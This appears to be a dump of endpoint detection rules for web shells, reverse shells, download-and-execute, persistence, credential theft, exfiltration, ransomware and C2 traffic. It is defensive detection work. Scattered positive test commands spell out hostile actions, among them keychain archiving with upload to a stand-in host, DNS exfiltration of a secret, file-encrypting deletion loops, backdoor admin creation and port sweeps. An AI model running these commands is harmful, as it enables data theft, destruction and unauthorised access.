rules.name: Web server process spawns a shell
rules.description: A web server parent starting a shell or command interpreter is the classic signature of a web shell, SQL command execution or an exploited service.

rules.name: Database server process spawns a shell
rules.description: A database server parent starting a shell or command interpreter is the classic signature of a web shell, SQL command execution or an exploited service.

rules.name: Web server spawns download or relay tool
rules.description: A web-serving process launching curl, wget, nc, nmap or similar indicates remote code execution used to pull tooling or pivot.

rules.name: Web server spawns identity or recon command
rules.description: Host discovery commands (id, whoami, uname, ifconfig, net user) run directly by a web server process are typical first commands of a web shell.

rules.name: Java process spawns shell with network tooling
rules.description: A JVM parent running a shell whose command line fetches remote content or opens a socket indicates deserialization or JNDI style exploitation.

rules.name: Node.js child opens reverse shell
rules.description: A node parent running a shell with /dev/tcp, nc -e or mkfifo redirection is a reverse shell from a compromised application.

rules.name: Python, Ruby or PHP child opens reverse shell
rules.description: A scripting-runtime parent whose child shell redirects to /dev/tcp or uses nc -e indicates injected code opening a reverse shell.

rules.name: Office or PDF reader spawns an interpreter
rules.description: Document applications launching shells, script hosts or LOLBins reveal macro or exploit based execution from a lure document.

rules.name: Office app spawns encoded or hidden PowerShell
rules.description: An Office parent starting PowerShell with encoded, hidden-window or download arguments is a hallmark of weaponised documents.

rules.name: Office app spawns wscript, cscript or mshta
rules.description: An Office parent running script hosts is document-driven payload delivery.

rules.name: Mail client spawns script or shell
rules.description: Outlook or Thunderbird launching script interpreters points to a malicious attachment or mail-rule execution.

rules.name: Browser spawns shell or script interpreter
rules.description: A browser parent launching a shell, osascript or script host indicates a drive-by exploit or a pasted-command lure.

rules.name: Explorer launches PowerShell download-and-execute
rules.description: Explorer starting PowerShell or mshta with iwr/iex or a URL matches pasted Run-dialog commands from fake-captcha lures.

rules.name: Package manager child fetches from a raw IP
rules.description: Install hooks or build steps that run curl or wget against a bare IP address instead of a registry hostname are a supply-chain payload pattern.

rules.name: CI runner step pipes raw-IP download to shell
rules.description: A build agent child running a fetch from a bare IP piped to a shell reflects poisoned pipeline steps staging code.

rules.name: npm lifecycle script runs shell with network tool
rules.description: An npm parent running sh whose command line has curl, wget or /dev/tcp against a URL or IP is a malicious install-script pattern.

rules.name: Python packaging step spawns network shell
rules.description: pip or setup.py children running shell with curl, wget or nc against an IP or paste host indicate a trojanised sdist executing at install.

rules.name: Package installer script downloads and executes
rules.description: dpkg or rpm maintainer scripts invoking curl or wget piped to a shell mean a package fetches a second stage during install.

rules.name: base64 decode piped into interpreter
rules.description: A single command line decodes base64 and feeds it to a shell or interpreter, hiding the payload from the command text.

rules.name: Hex decode piped to shell
rules.description: xxd -r -p or printf hex decoding piped into a shell hides a payload as hex text.

rules.name: openssl decrypt piped to shell
rules.description: openssl enc -d output fed to a shell or interpreter indicates an encrypted payload stage.

positive.command: sh -c openssl enc -d -aes-256-cbc -k x -in p.bin | bash

rules.name: python -c decodes and executes
rules.description: python -c with b64decode, zlib or marshal decoding followed by exec or eval is a common packed one-liner stager.

rules.name: perl -e with decode and eval
rules.description: perl -e one-liners that decode base64 or unpack data then eval run hidden payloads.

rules.name: ruby one-liner opens socket and execs shell
rules.description: ruby -rsocket -e with TCPSocket and exec, spawn or popen is a reverse shell one-liner.

rules.name: php -r socket reverse shell
rules.description: php -r with fsockopen or socket calls followed by exec, proc_open or system is a reverse shell one-liner.

rules.name: bash /dev/tcp reverse redirection
rules.description: bash -i with stdin and stdout redirected to /dev/tcp is a pure-shell reverse shell.

rules.name: mkfifo and netcat shell loop
rules.description: A fifo combined with nc into sh -i is the traditional pipe-based reverse shell for netcats without -e.

rules.name: netcat with -e or -c exec
rules.description: nc or ncat given -e or -c to attach a shell to a socket is a bind or reverse shell, not routine usage.

rules.name: socat exec shell over TCP
rules.description: socat with EXEC or SYSTEM of a shell and a TCP address provides a shell channel.

rules.name: PowerShell download cradle with IEX
rules.description: PowerShell fetching remote content and piping it to Invoke-Expression runs a payload without writing a file.

rules.name: PowerShell hidden window with encoded command
rules.description: Non-interactive, hidden-window PowerShell carrying a long encoded command is a classic malware launcher.

rules.name: PowerShell AMSI or logging tamper strings
rules.description: Command lines naming amsiInitFailed, AmsiUtils or script-block-logging disablement show defense tampering inside PowerShell.

rules.name: cmd chained download then run
rules.description: One cmd line chaining a downloader with a launch of the downloaded file stages and detonates a payload.

rules.name: Download, chmod and run in one command line
rules.description: A single line that fetches a file, sets the execute bit and runs it is automated payload staging.

negative.command: sh -c curl -o a.tgz https://x/a.tgz && tar xf a.tgz

rules.name: macOS curl, quarantine strip and execute
rules.description: curl, chmod +x or xattr strip and launch in one line on macOS is infostealer staging.

rules.name: wget to temp dir then execute
rules.description: A quiet wget writing into /tmp or /dev/shm and executing it in the same line is dropper behaviour.

rules.name: curl or wget piped to shell from raw IP
rules.description: Fetching a script from a bare IP address and piping into a shell avoids named infrastructure and runs unreviewed code.

rules.name: curl or wget piped to shell from paste or tunnel host
rules.description: Pulling script content from paste, transfer or tunnelling hosts into a shell avoids owned infrastructure.

rules.name: tftp or ftpget fetch then run
rules.description: A tftp or ftpget fetch followed by chmod and run in a single line is embedded-device malware staging.

rules.name: Process executed from shared-memory directory
rules.description: Binaries running from /dev/shm are almost always staged malware since nothing legitimate installs there.

rules.name: Temp-dir binary with network arguments
rules.description: An executable in a temp directory carrying host, port, pool or URL flags is a staged implant or miner talking out.

rules.name: Hidden dotfile executed from temp dir
rules.description: A dot-prefixed executable in a temp dir hides in directory listings and is a drop-and-run marker.

rules.name: Shell spawned by an app in Downloads or Desktop
rules.description: A shell or curl child whose parent lives in a Downloads or Desktop folder indicates a freshly downloaded app launching a stage.

rules.name: Windows user-dir executable with network arguments
rules.description: Executables in TEMP, AppData Roaming, Public or ProgramData started with URL or host arguments suggest dropped tools.

rules.name: Execution from Recycle Bin or PerfLogs
rules.description: Programs started from the Recycle Bin or PerfLogs are staging locations used to avoid normal install paths.

rules.name: Interpreter running temp-dir script that fetches a URL
rules.description: python, perl or bash running a script in a temp dir that also takes a URL or IP is typical stager behaviour.

rules.name: System process name running from a temp dir
rules.description: sshd, systemd, kworker, cron or similar names executing out of a temp directory is masquerading.

rules.name: Core Windows process outside System32
rules.description: svchost, lsass, csrss, winlogon or similar names running from non-System32 locations is masquerading.

rules.name: find -exec spawns shell
rules.description: find with -exec to a shell is a classic privilege-escalation or restricted-shell escape.

rules.name: awk system() shell escape
rules.description: awk BEGIN with system(/bin/sh) is a known shell breakout.

rules.name: vim or less shell escape on the command line
rules.description: vim -c with a shell bang or python os.execl spawns a shell from an editor, often under sudo.

rules.name: python pty.spawn shell upgrade
rules.description: python -c with pty.spawn to a shell is used to stabilise a reverse shell or break out of restricted tools.

rules.name: tar checkpoint-action exec
rules.description: tar with --checkpoint-action=exec runs arbitrary commands, abused via wildcard injection or sudo.

rules.name: sudo launching an interpreter shell escape
rules.description: sudo running python, perl, ruby, lua or nmap with a shell escape is sudoers-abuse escalation.

rules.name: env, nice or timeout exec shell keeping privileges
rules.description: env, nice, timeout or stdbuf spawning /bin/sh -p keeps the effective uid and is a SUID abuse pattern.

rules.name: git configured to run a shell command
rules.description: git -c core.sshCommand or core.pager set to a shell or network tool executes code via git.

rules.name: mshta with URL or inline script
rules.description: mshta running a remote HTA or inline vbscript or javascript executes code through a signed binary.

rules.name: regsvr32 scrobj with remote sct
rules.description: regsvr32 /i with a URL and scrobj.dll loads remote script (Squiblydoo).

rules.name: rundll32 with javascript, MiniDump or UNC dll
rules.description: rundll32 invoking javascript:, mshtml RunHTMLApplication, comsvcs MiniDump or a UNC DLL is proxy execution or credential dumping.

rules.name: wmic process call create with remote node
rules.description: wmic /node targeting another host with process call create is remote execution via WMI.

positive.command: wmic /node:10.0.0.5 process call create cmd.exe /c calc

rules.name: bitsadmin transfer or notify command
rules.description: bitsadmin /transfer from a URL or SetNotifyCmdLine is used to pull and launch payloads.

rules.name: MSBuild building project from user-writable path
rules.description: MSBuild executing a project or xml from temp, Public or a URL compiles and runs attacker inline tasks.

rules.name: certutil decode of staged file
rules.description: certutil -decode or -decodehex used to rebuild binaries from text is a file-smuggling technique.

rules.name: Indirect command execution via forfiles or pcalua
rules.description: forfiles /c or pcalua -a spawn commands through trusted binaries to dodge parent-child rules.

rules.name: InstallUtil or RegAsm on user-path assembly
rules.description: InstallUtil, RegAsm or RegSvcs run on a DLL from a temp or user dir is application-control bypass.

rules.name: osascript do shell script with download
rules.description: osascript invoking do shell script with curl or bash is AppleScript staging used by macOS stealers.

positive.command: osascript -e do shell script "curl -s http://h/a | sh"

rules.name: Quarantine attribute stripped from temp or Downloads file
rules.description: Stripping com.apple.quarantine from a file under /tmp or Downloads prepares it to bypass Gatekeeper.

rules.name: Gatekeeper assessment disabled
rules.description: spctl --master-disable turns off Gatekeeper system wide.

rules.name: security CLI extracting keychain secrets
rules.description: security dump-keychain or find-generic-password -w extracts stored secrets from the login keychain.

rules.name: TCC database edited via sqlite
rules.description: Writing to TCC.db with sqlite3 grants privacy permissions silently.

positive.command: sqlite3 TCC.db insert into access values('kTCCServiceAccessibility')

rules.name: Debugger attach to another process with call
rules.description: gdb -p combined with call or dlopen injects code into a live process.

rules.name: Cron directory write
rules.description: A file created or changed under cron spool and cron.d directories installs scheduled execution.

rules.name: systemd unit file created
rules.description: A new unit file under /etc/systemd or user unit dirs establishes service persistence.

rules.name: Shell startup or rc.local modified
rules.description: Writes to rc.local, /etc/profile.d or shell rc files give login-time execution.

rules.name: ld.so.preload written
rules.description: Writing /etc/ld.so.preload injects a library into every dynamically linked process, a userland rootkit hallmark.

rules.name: sudoers file created or modified
rules.description: Changes under /etc/sudoers.d grant privilege without touching users or groups.

rules.name: PAM or sshd configuration modified
rules.description: Edits to /etc/pam.d or sshd_config can add backdoor authentication or permit root login.

rules.name: PAM shared object dropped
rules.description: A .so created in the PAM module directory can intercept credentials.

rules.name: Script or binary written inside .ssh
rules.description: Executable content landing in ~/.ssh outside the usual key files hides payloads where few people look.

rules.name: Hidden executable written to temp dir
rules.description: A hidden dotfile with executable-style extension in a temp directory is a dropper marker.

rules.name: Kernel module written to module directory
rules.description: A new .ko under /lib/modules is a rootkit installation marker.

rules.name: LaunchDaemon plist created
rules.description: A new plist in /Library/LaunchDaemons gives root-level boot persistence on macOS.

rules.name: macOS shell startup file written
rules.description: Writes to zshrc, zprofile or zshenv add execution at every shell start.

rules.name: Dylib written to user Library or temp
rules.description: A .dylib created under a user's Library or /tmp supports dylib hijack or injection staging.

rules.name: Executable placed in Startup folder
rules.description: Executables or scripts created in the Startup folder run at each logon.

rules.name: Scheduled task file written directly
rules.description: A file created in the System32 Tasks directory outside schtasks creates hidden scheduled execution.

rules.name: DLL created in System32 or SysWOW64
rules.description: New DLLs in system directories enable search-order or sideloading persistence.

rules.name: WMI MOF file dropped
rules.description: A .mof in wbem can register WMI event consumers for persistence.

rules.name: Executable content dropped in Public or ProgramData
rules.description: Executable content created in C:\Users\Public or ProgramData is common malware staging.

rules.name: Script created in web root
rules.description: A server-side script created under a web root is how web shells are planted.

rules.name: Server script appears in upload or media directory
rules.description: An executable server script inside an uploads, images or cache directory is an upload-bypass web shell.

rules.name: SSH key material staged in temp
rules.description: authorized_keys or private key files in temp dirs show key staging before install or theft.

rules.name: Shadow or password hash file opened
rules.description: Read access to /etc/shadow or gshadow is the precursor of offline cracking and rarely appears outside auth daemons.

rules.name: Browser credential database read
rules.description: Reads of Login Data, logins.json or cookie databases show browser secret harvesting.

rules.name: SSH private key opened
rules.description: Opening id_rsa or id_ed25519 private keys indicates theft for lateral movement; legitimate use is by ssh itself.

rules.name: Cloud credential file opened
rules.description: Reads of aws credentials, gcloud, azure or kube config reveal cloud key harvesting.

rules.name: Keychain database accessed as a file
rules.description: Direct opens of login.keychain-db or the system keychain bypass the security tool and indicate theft.

rules.name: SAM, SYSTEM or NTDS hive accessed
rules.description: Opening or copying the SAM or SYSTEM hives or ntds.dit enables offline credential extraction.

rules.name: LSASS or process memory dump created
rules.description: A dmp file named lsass, or a dmp in a temp dir, is a credential dump artefact.

rules.name: Shell history or secret dotfile opened
rules.description: Reads of netrc, pgpass, git-credentials, npmrc or pypirc harvest stored secrets.

rules.name: Credential file copied to temp
rules.description: Credential stores copied into a temp dir (shadow, passwd, keys, ntds) are staged for exfiltration.

rules.name: Archive of sensitive directory with upload in same line
rules.description: tar or zip of .ssh, .aws, /etc or keychains with curl, nc or scp in the same command is credential exfiltration.

positive.command: bash -c zip -r k.zip ~/Library/Keychains && curl -F f=@k.zip http://h/u

rules.name: tar piped directly into a network client
rules.description: tar to stdout piped into nc, curl -T or openssl streams a directory off the box without a local file.

negative.command: sh -c tar cf - src | gzip > src.tgz

rules.name: Password-protected archive of user documents
rules.description: zip -P or 7z -p over Documents or Desktop shows staged, encrypted exfil packaging.

rules.name: Archive then upload in one Windows command line
rules.description: Compress-Archive, 7z or rar followed by curl, Invoke-WebRequest or ftp in one line stages and sends data.

positive.command: cmd /c 7z a d.7z C:\data && curl -T d.7z http://h/u

rules.name: curl or wget posting a sensitive file
rules.description: curl -F, -T or --data-binary of passwd, shadow, keys or env files sends secrets out.

rules.name: Shell loop encoding data into DNS lookups
rules.description: A loop building lookups with encoded file content exfiltrates via DNS.

positive.command: bash -c for l in $(xxd -p secret|fold -w30); do dig $l.x.example.com; done

negative.command: bash -c for h in a b; do dig $h.example.com; done

rules.name: scp or rsync of sensitive directories to remote host
rules.description: scp or rsync sending .ssh, .aws or /etc credentials to user@host is credential exfiltration.

rules.name: Ransom note file created
rules.description: Files named like decrypt or recover instructions are dropped by ransomware in each affected directory.

rules.name: File created or renamed with ransomware extension
rules.description: Files ending in known ransomware or generic locked extensions suggest bulk encryption.

rules.name: Email or ID style double extension
rules.description: Many families append [email].ext or id suffixes after the original extension; the shape is a strong encryption marker.

rules.name: ESXi virtual disk renamed or encrypted
rules.description: Ransomware-extension files on VMFS datastores hit hypervisor storage.

rules.name: Ransom note dropped on Desktop
rules.description: Notes or images dropped to the Desktop with decrypt or ransom wording announce the infection.

rules.name: Shadow copy or backup deletion
rules.description: vssadmin, wmic, wbadmin or bcdedit commands that delete shadows, catalogs or recovery are classic pre-encryption steps.

rules.name: Bulk file encryption loop that removes originals
rules.description: A find or for loop piping files through openssl enc or gpg then removing originals mirrors script ransomware.

positive.command: sh -c find /srv -type f -exec openssl enc -e -aes256 -k x -in {} -out {}.enc ; -exec rm {} ;

rules.name: Disk or log wiping command
rules.description: dd, shred or wipefs against block devices or logs destroys data or evidence.

rules.name: Linux logs truncated or removed by command
rules.description: Truncating or deleting auth.log, wtmp or lastlog in one command hides tracks.
rules.technique_name: Clear Linux or Mac System Logs

rules.name: Shell history disabled
rules.description: Unsetting HISTFILE or linking history to /dev/null in a command stops command recording.

rules.name: Timestamp copy onto staged files
rules.description: touch -r or -t against system dirs or staging dirs hides modification time.

rules.name: Security agent or firewall disabled by command
rules.description: Stopping auditd, ufw, firewalld, selinux or AV services in one command is defence impairment.

rules.name: Windows Defender exclusion or disable
rules.description: Set-MpPreference exclusions or disabling realtime monitoring prepares for malware execution.

rules.name: Windows event log cleared or audit policy off
rules.description: wevtutil cl, Clear-EventLog or auditpol /clear removes telemetry.

rules.name: crontab installed from a pipe
rules.description: Installing a cron entry from echo or a downloader pipe creates persistence in one line.

rules.name: Systemd unit written and enabled from one command
rules.description: A single command line that writes a .service and runs systemctl enable or start is an installer-style implant.

rules.name: Scheduled task running from user-writable path or script host
rules.description: schtasks /create with a payload in Temp, Public or AppData, or a script host, is persistence staging.

rules.name: Service created pointing to user-writable binary or shell
rules.description: sc create with a binPath in temp, Public or a cmd or powershell wrapper is service persistence or PsExec style launch.

positive.command: sc create evil binPath= cmd.exe /c C:\a.exe

negative.command: sc create MySvc binPath= C:\Program Files\My\svc.exe

rules.name: Backdoor account creation in one line
rules.description: useradd with uid 0 and -o, or adding passwordless sudo in one line, creates a backdoor account.

rules.name: Windows account added and elevated in one line
rules.description: net user /add chained with net localgroup administrators /add creates a hidden admin.

positive.command: cmd /c net user svc P@ss1 /add && net localgroup administrators svc /add

rules.name: SUID bit set on shell or temp binary
rules.description: chmod u+s or 4755 on a shell, interpreter or temp file plants a privilege-escalation backdoor.

rules.name: Dangerous file capability granted
rules.description: setcap cap_setuid, cap_sys_admin or cap_dac_override on interpreters or temp binaries grants quiet root.

rules.name: Container started privileged with host access
rules.description: docker run --privileged with the host root mounted or host pid is a container escape to host root.

rules.name: Instance metadata credentials requested
rules.description: curl to 169.254.169.254 for security-credentials or token endpoints steals cloud role credentials.

rules.name: Reading another process environ or mem
rules.description: Commands reading /proc/PID/environ or mem with cat, strings or dd harvest secrets from live processes.

rules.name: Port or host sweep over a whole subnet
rules.description: nmap, masscan or zmap with CIDR targets and broad port flags, or bash loops over /dev/tcp, are internal reconnaissance.

positive.command: bash -c for p in $(seq 1 1024); do (echo > /dev/tcp/10.0.0.5/$p) 2>/dev/null && echo $p; done

rules.name: ssh dynamic or reverse tunnel to remote host
rules.description: ssh -N with -R, -D or -w is a persistent tunnel to bypass perimeter controls.

rules.name: Tunnelling tool exposing a local port
rules.description: ngrok, cloudflared, chisel, frp or ligolo used with tcp, http, client or connect args exposes internal services externally.

rules.name: Cryptominer pool arguments
rules.description: stratum URLs and pool flags on any binary identify mining irrespective of name.

rules.name: Recursive world-writable permissions on system or web dir
rules.description: chmod -R 777 on etc, usr or web roots weakens protections and is used for persistence and privilege abuse.
rules.technique_name: Linux and Mac File and Directory Permissions Modification

rules.name: icacls grants Everyone full control on system path
rules.description: icacls /grant Everyone:F on Windows or Program Files paths prepares tampering or service hijack.
rules.technique_name: Windows File and Directory Permissions Modification

rules.name: Outbound to classic implant listener ports
rules.description: Connections to 4444, 4443, 31337, 1337, 6666 or 9001 are common default handler ports; benign use exists but is rare.

rules.name: Outbound IRC-style ports to raw IP
rules.description: Connections to 6660-6669 or 7000 on bare IPs hint at IRC botnet C2.

rules.name: Connection to Tor relay or local Tor SOCKS port
rules.description: Destinations on 9001, 9030, 9050 or 9150 signal Tor circuits or local Tor SOCKS use.

rules.name: Raw IP on uncommon high port
rules.description: Bare-IP destinations on ports such as 8888, 9999, 12345 or 54321 are often one-off C2 or payload servers.

rules.name: Lateral-movement ports to raw IP
rules.description: Direct connections to 445, 3389, 5985, 5986, 135 or 139 on bare IPs suggest scanning or lateral movement from a workstation.

rules.name: Database ports on raw IP
rules.description: Direct connections to 3306, 5432, 1433, 27017, 6379 or 9200 on bare IPs may be data theft or exposed-DB access.

rules.name: DoT or mDNS ports to raw IP
rules.description: Raw-IP destination on 853, 5353 or 5355 from endpoints bypasses the corporate resolver and can hide C2 lookups.

rules.name: Telnet and r-service ports to raw IP
rules.description: Telnet, TFTP or r-service ports on bare IPs reflect IoT botnet propagation and cleartext legacy access.

rules.name: Connection to cloud metadata endpoint
rules.description: Any workload reaching 169.254.169.254 or the cloud metadata names may be harvesting role credentials (expected for cloud agents).

rules.name: Connection to container control-plane ports
rules.description: Ports 2375, 10250, 10255 or 2379 target unauthenticated Docker, kubelet or etcd APIs, common in cloud takeover.

rules.name: Raw IP on mining stratum ports
rules.description: Bare IP with 3333, 14444, 14433, 45700 or 10128 matches pool connections.

rules.name: Connection to reverse-tunnel service domain
rules.description: Destinations on ngrok, trycloudflare, serveo, localtunnel or pagekite give attackers disposable channels.

rules.name: Connection to paste or anonymous file drop host
rules.description: Pastebin-like and anonymous upload hosts are used for payload staging and data drops.

rules.name: Connection to chat webhook, bot API or OAST host
rules.description: Discord, Telegram, webhook and OAST-style endpoints are widely used as stealer and implant C2.
